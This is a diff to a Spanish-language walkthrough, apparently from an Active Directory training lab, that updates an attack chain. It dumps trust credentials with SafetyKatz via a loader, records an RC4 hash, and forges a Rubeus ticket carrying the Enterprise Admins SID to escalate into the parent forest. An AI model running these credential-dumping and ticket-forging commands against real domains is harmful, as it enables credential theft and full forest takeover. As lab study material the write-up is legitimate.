@@ -1363,9 +1363,13 @@ Y ahora podremos ejecutaremos el *SafetyKatz* para extraer las credenciales
 C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"
 ```
 
+Copiaremos el rc4_hmac_nt `9688c44bcc2ad7ea6f1ba555b0f4981f`
+
+
+
 Obteniendo las credenciales del dominio, podemos crear un ticket con el SID de los *Enterprise Admins*
 ```shell
-C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:132f54e05f7c3db02e97c00ff3879067 /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /ldap /user:Administrator /nowrap
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:9688c44bcc2ad7ea6f1ba555b0f4981f /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /ldap /user:Administrator /nowrap
 ```
  
 El ticket que se nos ha creado en base64 lo copiamos y lo usamos para inyectarlo y poder acceder a *MCORP*
